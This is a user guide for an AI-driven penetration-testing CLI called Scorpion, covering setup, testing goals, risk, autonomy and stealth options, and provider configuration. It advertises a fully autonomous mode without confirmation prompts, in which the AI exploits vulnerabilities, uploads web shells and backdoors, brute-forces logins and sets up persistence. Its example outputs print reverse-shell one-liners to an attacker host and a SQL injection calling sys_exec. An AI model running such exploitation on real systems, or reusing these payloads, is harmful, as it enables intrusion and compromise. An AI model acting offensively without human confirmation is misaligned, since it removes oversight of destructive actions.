# AI Penetration Testing Guide ü§ñü¶Ç

**Autonomous AI-powered security testing with Scorpion CLI**

---

## üöÄ Quick Start (2 Minutes)

### 1. Setup API Key

```bash
# Get FREE GitHub Models token: https://github.com/marketplace/models
export SCORPION_AI_API_KEY='ghp_your_token_here'

# Or use .env file
echo "SCORPION_AI_API_KEY=ghp_your_token" >> .env
```

### 2. Run Your First AI Pentest

```bash
# Basic scan (auto-detects provider from API key!)
scorpion ai-pentest -t example.com

# Scan localhost (your development server)
scorpion ai-pentest -t localhost:5000

# That's it! AI will:
# ‚úÖ Reconnaissance (DNS, WHOIS, tech detection)
# ‚úÖ Port scanning and service enumeration
# ‚úÖ OS fingerprinting
# ‚úÖ Vulnerability discovery
# ‚úÖ Auto-generate test payloads for EVERY vulnerability found
# ‚úÖ Provide code-level remediation with secure code examples
# ‚úÖ Analyze your tech stack to provide framework-specific fixes
# ‚úÖ Generate detailed report with PoC steps

# ‚ö° WORKS WITH LOCALHOST! Test your dev apps safely:
# - localhost, 127.0.0.1, ::1
# - localhost:3000, localhost:8080, etc.
# - 192.168.x.x (local network)
# See: LOCALHOST_SCANNING_GUIDE.md

# AGGRESSIVE MODE - Actually exploit and gain shell (AUTHORIZED ONLY!)
scorpion ai-pentest -t example.com -r high -g gain_shell_access

# ‚ö†Ô∏è AI will ACTIVELY:
# üî• Exploit discovered vulnerabilities
# üî• Generate and execute reverse shell payloads
# üî• Attempt file upload exploits
# üî• Bruteforce weak credentials
# üî• Gain actual shell access, NOT just report findings!
```

---

## üéØ Testing Goals

### Comprehensive Assessment (Default)
```bash
scorpion ai-pentest -t example.com -g comprehensive_assessment
```
- Full reconnaissance
- Port scanning (1-1024)
- Service enumeration
- Vulnerability discovery
- Technology detection
- SSL/TLS analysis

### Vulnerability Discovery
```bash
scorpion ai-pentest -t example.com -g vulnerability_discovery -r high
```
- OWASP Top 10 testing (SQLi, XSS, RCE, SSRF)
- Directory busting
- Parameter fuzzing
- API security testing
- Default credential checks
- Nuclei CVE scanning

### Shell Access - AGGRESSIVE EXPLOITATION (AUTHORIZED ONLY!)
```bash
scorpion ai-pentest -t target.com -g gain_shell_access -r high -a fully_autonomous
```
‚ö†Ô∏è **WARNING: Requires explicit written authorization!**

üî• **AGGRESSIVE MODE - This is NOT passive vulnerability scanning!**

AI will ACTIVELY EXPLOIT and GAIN REAL SHELL ACCESS:
- ‚úÖ Find command injection ‚Üí **EXPLOIT IT** ‚Üí Get shell
- ‚úÖ Find RCE vulnerability ‚Üí **EXPLOIT IT** ‚Üí Get shell  
- ‚úÖ Find file upload flaw ‚Üí **UPLOAD SHELL** ‚Üí Get access
- ‚úÖ Find weak credentials ‚Üí **BRUTEFORCE** ‚Üí Login and escalate
- ‚úÖ Find SQLi ‚Üí **INJECT PAYLOADS** ‚Üí Execute OS commands
- ‚úÖ Generate reverse shell payloads ‚Üí **EXECUTE THEM**
- ‚úÖ Upload web shells (PHP/JSP/ASPX) ‚Üí **GET INTERACTIVE ACCESS**
- ‚úÖ Exploit services (SSH/RDP/FTP) ‚Üí **GAIN REMOTE ACCESS**

**This is RED TEAM mode - AI will attempt to compromise the system, not just document issues!**

### Web Exploitation
```bash
scorpion ai-pentest -t webapp.com -g web_exploitation -r medium
```
- SQL injection (error-based, boolean, time-based)
- Cross-site scripting (reflected, stored, DOM)
- SSRF (Server-Side Request Forgery)
- XXE (XML External Entity)
- SSTI (Server-Side Template Injection)
- Authentication bypass
- Authorization flaws (IDOR, privilege escalation)

### Infrastructure Assessment
```bash
scorpion ai-pentest -t target.com -g infrastructure_assessment
```
- Deep port scanning (1-10000)
- UDP service discovery
- Cloud storage audits (S3, Azure, GCP)
- Kubernetes API exposure
- Container registry security
- Network topology mapping

---

## ‚öôÔ∏è Configuration Options

### Risk Tolerance
```bash
# Low - Passive reconnaissance only (NO exploitation)
scorpion ai-pentest -t example.com -r low
# ‚Üí Only lists findings, never exploits

# Medium - Active scanning, NO exploitation (DEFAULT)
scorpion ai-pentest -t example.com -r medium
# ‚Üí Tests vulnerabilities but does NOT exploit
# ‚Üí Reports SQLi, XSS, RCE but won't execute payloads

# High - ACTIVE EXPLOITATION (requires authorization)
scorpion ai-pentest -t example.com -r high -g gain_shell_access
# ‚Üí ACTUALLY EXPLOITS vulnerabilities
# ‚Üí Generates and executes payloads to gain shell
# ‚Üí Uploads web shells and backdoors
# ‚Üí This is REAL penetration testing, not just scanning!
```

### Autonomy Level
```bash
# Supervised - Asks permission before each action
scorpion ai-pentest -t example.com -a supervised

# Semi-Autonomous - Asks before high-risk actions (DEFAULT)
scorpion ai-pentest -t example.com -a semi_autonomous

# Fully Autonomous - No confirmation prompts
scorpion ai-pentest -t example.com -a fully_autonomous -r high
```

### Stealth Level
```bash
# Low - Fast, aggressive (noisy)
scorpion ai-pentest -t example.com -s low

# Moderate - Balanced (DEFAULT)
scorpion ai-pentest -t example.com -s moderate

# High - Slow, evasive (stealthy)
scorpion ai-pentest -t example.com -s high
```

### Time Limit
```bash
# Short scan (default: 15 minutes)
scorpion ai-pentest -t example.com --time-limit 15

# Extended scan (60 minutes)
scorpion ai-pentest -t example.com --time-limit 60 -g comprehensive_assessment
```

---

## üîß AI Provider Options

### Auto-Detection (Recommended)
```bash
# GitHub Models (FREE) - API key starts with ghp_
export SCORPION_AI_API_KEY='ghp_...'
scorpion ai-pentest -t example.com

# OpenAI - API key starts with sk-proj- or sk-
export SCORPION_AI_API_KEY='sk-proj-...'
scorpion ai-pentest -t example.com

# Anthropic Claude - API key starts with sk-ant-
export SCORPION_AI_API_KEY='sk-ant-...'
scorpion ai-pentest -t example.com
```

### Manual Provider Selection
```bash
# GitHub Models with specific model
scorpion ai-pentest -t example.com --ai-provider github --model gpt-4o

# OpenAI GPT-4
scorpion ai-pentest -t example.com --ai-provider openai --model gpt-4

# Anthropic Claude Sonnet
scorpion ai-pentest -t example.com --ai-provider anthropic --model claude-3-sonnet-20240229

# Custom OpenAI-compatible endpoint (local LLM)
scorpion ai-pentest -t example.com \
  --ai-provider custom \
  --api-endpoint http://localhost:1234/v1/chat/completions \
  --api-key local
```

---

## üìä What the AI Does

### Phase 1: Reconnaissance (Iterations 1-3)
```
‚úÖ DNS enumeration (A, AAAA, MX, TXT, NS records)
‚úÖ WHOIS lookup (registration info)
‚úÖ Subdomain discovery
‚úÖ Technology detection (frameworks, CMS, CDN, WAF)
‚úÖ OS fingerprinting
```

### Phase 2: Scanning & Enumeration (Iterations 4-7)
```
‚úÖ Port scanning (TCP/UDP)
‚úÖ Service version detection
‚úÖ Banner grabbing
‚úÖ Web crawling (endpoints, API paths)
‚úÖ Directory busting (admin panels, backups)
‚úÖ SSL/TLS analysis
```

### Phase 3: Vulnerability Discovery (Iterations 8-12)
```
‚úÖ Web application testing (SQLi, XSS, RCE, SSRF, XXE, SSTI)
‚úÖ API security testing
‚úÖ Parameter fuzzing
‚úÖ Authentication testing
‚úÖ Subdomain takeover checks
‚úÖ Cloud misconfiguration audits
‚úÖ Nuclei CVE scanning
‚úÖ üß™ AUTO-GENERATE test payloads for EVERY vulnerability
‚úÖ üîß AUTO-GENERATE secure code fixes with remediation
‚úÖ üíª ANALYZE tech stack for framework-specific solutions
```

### Phase 4: ACTIVE EXPLOITATION (Iterations 13-16, HIGH RISK ONLY)
```
üî• Credential bruteforce ‚Üí GAIN ACCESS to SSH/FTP/HTTP/databases
üî• Command injection ‚Üí EXECUTE OS COMMANDS ‚Üí Deploy reverse shell
üî• File upload vulnerability ‚Üí UPLOAD WEB SHELL ‚Üí Get interactive access
üî• SQL injection ‚Üí EXECUTE xp_cmdshell/sys_exec ‚Üí OS command execution
üî• RCE vulnerability ‚Üí GENERATE PAYLOAD ‚Üí Execute for shell access
üî• Unrestricted file upload ‚Üí UPLOAD BACKDOOR ‚Üí Persistent access
üî• Weak/default creds ‚Üí LOGIN ‚Üí Escalate privileges ‚Üí Deploy persistence

‚ö†Ô∏è AI DOES NOT stop at "Found SQLi" - it EXPLOITS to gain shell!
‚ö†Ô∏è AI DOES NOT just report - it ACTIVELY COMPROMISES the system!
‚ö†Ô∏è This is OFFENSIVE security, not defensive scanning!
```

### Phase 5: Post-Exploitation (Iterations 17+, HIGH RISK ONLY)
```
‚ö†Ô∏è Privilege escalation enumeration
‚ö†Ô∏è Sensitive data discovery
‚ö†Ô∏è Internal network mapping
‚ö†Ô∏è Persistence mechanisms
```

---

## üìñ Real-World Examples

### Example 1: Quick Security Assessment
```bash
# 5-minute security check
scorpion ai-pentest -t mywebsite.com --time-limit 5

# Output:
# ‚úÖ Found 3 open ports (80, 443, 22)
# ‚úÖ Detected Apache 2.4.52 (Ubuntu)
# ‚ö†Ô∏è TLS 1.0 enabled (MEDIUM severity)
# ‚úÖ No critical vulnerabilities
```

### Example 2: Deep Vulnerability Scan
```bash
# 30-minute comprehensive scan
scorpion ai-pentest -t webapp.com \
  -g vulnerability_discovery \
  -r high \
  --time-limit 30

# AI will:
# 1. Scan all ports (1-10000)
# 2. Crawl entire website
# 3. Test all discovered endpoints
# 4. Fuzzing parameters for injection
# 5. Run Nuclei for known CVEs
# 6. Bruteforce common paths
# 7. Generate detailed report
```

### Example 3: Authorized Red Team Exercise - AGGRESSIVE EXPLOITATION
```bash
# Full exploitation (with authorization letter!)
scorpion ai-pentest -t authorized-target.com \
  -g gain_shell_access \
  -r high \
  -a fully_autonomous \
  --time-limit 60

# AI will ACTIVELY ATTACK to gain shell:
# 1. Enumerate all services
# 2. Test default credentials ‚Üí LOGIN if found
# 3. Bruteforce authentication ‚Üí GAIN ACCESS
# 4. Find SQLi ‚Üí INJECT commands ‚Üí EXECUTE reverse shell
# 5. Find file upload ‚Üí UPLOAD PHP/JSP shell ‚Üí GET WEBSHELL
# 6. Find RCE ‚Üí GENERATE payload ‚Üí EXECUTE for shell
# 7. Setup listener ‚Üí CATCH reverse shell ‚Üí INTERACTIVE ACCESS
# 8. NOT just a report - you get ACTUAL SHELL ACCESS!

# Example Output:
# ‚úÖ Found SQLi in /login?user=
# üî• Exploiting SQLi to execute OS commands...
# üî• Uploading reverse shell payload...
# üî• Executing: bash -i >& /dev/tcp/attacker/4444 0>&1
# ‚úÖ SHELL OBTAINED! Connected on port 4444
# üéØ System compromised - root@target:/#
```

### Example 4: API Security Testing
```bash
# Test API endpoints
scorpion ai-pentest -t api.example.com \
  -g api_security_testing \
  -r medium

# AI will:
# 1. Discover API endpoints
# 2. Test authentication mechanisms
# 3. Check for IDOR vulnerabilities
# 4. Test authorization controls
# 5. Fuzzing API parameters
# 6. Rate limit testing
```

---

## üéØ AI Decision Making

The AI agent makes intelligent decisions based on:

1. **Previous Findings:** Analyzes results from prior tools
2. **Testing Goal:** Aligns actions with primary objective
3. **Risk Tolerance:** Respects configured safety boundaries
4. **Time Budget:** Prioritizes high-impact actions
5. **Stealth Requirements:** Adapts to detection risk
6. **Tool Chaining:** Logically sequences testing phases

**Example Decision Chain - EXPLOITATION IN ACTION:**
```
1. recon ‚Üí Discovers subdomains and technologies
2. port_scan ‚Üí Finds open port 8080 (Tomcat)
3. web_pentest ‚Üí Detects file upload without validation
4. payload_generate ‚Üí Creates JSP web shell payload
5. exploit_vuln ‚Üí UPLOADS shell.jsp to /uploads/
6. execute_command ‚Üí ACCESSES http://target:8080/uploads/shell.jsp
7. üéØ RESULT: Interactive web shell obtained!
8. post_exploit ‚Üí Enumerates system, escalates privileges

Another Real Example:
1. web_pentest ‚Üí Finds SQLi in /api/users?id=1
2. exploit_vuln ‚Üí Injects: 1' UNION SELECT sys_exec('whoami')--
3. payload_generate ‚Üí Creates: bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
4. exploit_vuln ‚Üí Executes via SQLi to spawn reverse shell
5. üéØ RESULT: Root shell obtained, system compromised!
```

---

## üìù Report Output

AI pentest generates comprehensive JSON report:

```json
{
  "summary": {
    "target": "example.com",
    "primary_goal": "comprehensive_assessment",
    "duration_minutes": 12.5,
    "iterations": 10,
    "total_findings": 15,
    "ai_provider": "github",
    "ai_model": "gpt-4o-mini"
  },
  "findings_by_severity": {
    "critical": 1,
    "high": 3,
    "medium": 5,
    "low": 4,
    "info": 2
  },
  "detailed_findings": [
    {
      "timestamp": "2025-12-12T10:30:45",
      "tool": "web_pentest",
      "severity": "critical",
      "category": "web_application",
      "description": "SQL Injection in /login endpoint",
      "exploitation_potential": "critical",
      "recommended_action": "Use parameterized queries"
    }
  ],
  "recommendations": [
    "üö® URGENT: Address 1 critical vulnerability",
    "‚ö†Ô∏è HIGH PRIORITY: Fix 3 high-severity issues"
  ]
}
```

**View report:**
```bash
cat ai_pentest_example.com_20251212_083908.json | jq .summary
```

---

## üõ°Ô∏è Safety & Legal

### ‚ö†Ô∏è CRITICAL WARNINGS

1. **Authorization Required:** NEVER scan systems without explicit written permission
2. **Legal Consequences:** Unauthorized testing is illegal in most jurisdictions
3. **Ethical Boundaries:** Respect privacy, data protection laws, and ToS
4. **High-Risk Actions:** Exploitation requires risk_tolerance=HIGH and authorization
5. **No Liability:** Use at your own risk, authors not responsible for misuse

### üî• EXPLOITATION MODE WARNING

**When you use `-r high -g gain_shell_access`, the AI will:**
- ‚ùå NOT just scan and report vulnerabilities
- ‚úÖ ACTIVELY EXPLOIT found vulnerabilities
- ‚úÖ EXECUTE payloads to gain shell access
- ‚úÖ UPLOAD backdoors and web shells
- ‚úÖ BRUTEFORCE authentication if needed
- ‚úÖ COMPROMISE the target system

**This is REAL offensive hacking, not passive scanning!**

**You MUST have:**
- Written authorization from system owner
- Clear scope definition
- Legal indemnification
- Incident response plan

**Do NOT use exploitation mode on:**
- Systems you don't own
- Production systems without approval
- Shared hosting environments
- Any system without explicit permission

### ‚úÖ Best Practices

- Always get written authorization before testing
- Start with low risk tolerance (-r low)
- Use stealth mode on production systems (-s high)
- Review findings before exploitation
- Keep API keys secure (.env in .gitignore)
- Document your scope and authorization
- Follow responsible disclosure practices

---

## üÜö Comparison: Manual vs AI Pentest

| Task | Manual Testing | AI Pentest |
|------|---------------|-----------|
| **Port Scan** | Run nmap command | Automatic |
| **Service Enum** | Manual banner grab | Automatic |
| **Vuln Discovery** | Research CVEs | AI analyzes findings |
| **Tool Selection** | Choose next tool | AI decides strategy |
| **Exploitation** | Manual payload crafting | AI generates AND EXECUTES payloads |
| **Shell Access** | Manual exploitation ‚Üí shell | AI auto-exploits ‚Üí shell (high risk) |
| **Report Writing** | Hours of documentation | Instant JSON report + PROOF |
| **Time** | Days/weeks | Minutes/hours |
| **Cost** | Expensive consultant | FREE with GitHub Models |

---

## üí° Pro Tips

### Tip 1: Use GitHub Models (FREE!)
```bash
# No cost, no credit card required
# Get token: https://github.com/marketplace/models
export SCORPION_AI_API_KEY='ghp_your_github_token'
scorpion ai-pentest -t example.com
# Cost: $0.00 ‚úÖ
```

### Tip 2: Start Conservative, Scale Up
```bash
# Start passive
scorpion ai-pentest -t example.com -r low

# Review findings, then increase
scorpion ai-pentest -t example.com -r medium

# If authorized, go aggressive
scorpion ai-pentest -t example.com -r high -g gain_shell_access
```

### Tip 3: Focus on Specific Goals
```bash
# Don't use comprehensive_assessment for everything
# Be specific:
-g vulnerability_discovery  # Find bugs
-g web_exploitation        # Test web apps
-g infrastructure_assessment  # Network security
-g api_security_testing    # API testing
```

### Tip 4: Use Learning Mode
```bash
# Watch AI decision-making process
scorpion ai-pentest -t example.com --learning-mode

# AI explains:
# - Why it chose each tool
# - What it learned from findings
# - Strategic reasoning
```

### Tip 5: Combine with Manual Tools
```bash
# Run AI pentest first for reconnaissance
scorpion ai-pentest -t example.com -r low --time-limit 10

# Use findings to guide manual testing
# AI found SQL injection? ‚Üí Test manually with sqlmap
# AI found open ports? ‚Üí Deep dive with nmap -A
```

---

## üîß Troubleshooting

### "API key required"
```bash
# Check if key is loaded
echo $SCORPION_AI_API_KEY

# If empty, set it:
export SCORPION_AI_API_KEY='your_key_here'
```

### "401 Unauthorized"
- GitHub token expired ‚Üí Regenerate at https://github.com/settings/tokens
- OpenAI key invalid ‚Üí Check at https://platform.openai.com/api-keys

### "Rate limit exceeded"
- GitHub Models: Wait 1 minute (15-60 requests/min limit)
- OpenAI: Check usage at https://platform.openai.com/usage
- Solution: Use --time-limit to slow down, or wait

### "No findings"
- Target may be well-secured (good!)
- Increase --time-limit for deeper testing
- Try different goals (-g vulnerability_discovery)
- Use higher risk tolerance (-r high) if authorized

---

## üìö Additional Resources

- **Localhost Scanning:** [LOCALHOST_SCANNING_GUIDE.md](LOCALHOST_SCANNING_GUIDE.md) - Test your local apps safely
- **Test Payload & Code Analysis:** [AI_PAYLOAD_TESTING_GUIDE.md](AI_PAYLOAD_TESTING_GUIDE.md) - Auto-generated payloads & remediation
- **Exploitation Implementation:** [EXPLOITATION_IMPLEMENTATION.md](EXPLOITATION_IMPLEMENTATION.md) - How exploitation works
- **Setup Guide:** [GITHUB_MODELS_SETUP.md](GITHUB_MODELS_SETUP.md)
- **API Configuration:** [API_KEY_SETUP.md](API_KEY_SETUP.md)
- **Main README:** [README.md](README.md)
- **Command Reference:** [COMMANDS.md](COMMANDS.md)
- **GitHub Models:** https://github.com/marketplace/models

---

## üéì Learning Path

### Beginner
1. Run reconnaissance scan: `-r low`
2. Review JSON report
3. Understand finding severities
4. Learn about discovered vulnerabilities

### Intermediate
1. Test vulnerability discovery: `-g vulnerability_discovery -r medium`
2. Analyze AI decision-making
3. Verify findings manually
4. Practice remediation recommendations

### Advanced
1. Authorized exploitation: `-g gain_shell_access -r high`
2. Chain multiple testing goals
3. Integrate with other tools (Burp, Metasploit)
4. Custom payload development

---

**Remember:** With great power comes great responsibility. Use ethically! ü¶∏‚Äç‚ôÇÔ∏èüîí

---

**Last Updated:** December 11, 2025  
**Version:** 2.0.2
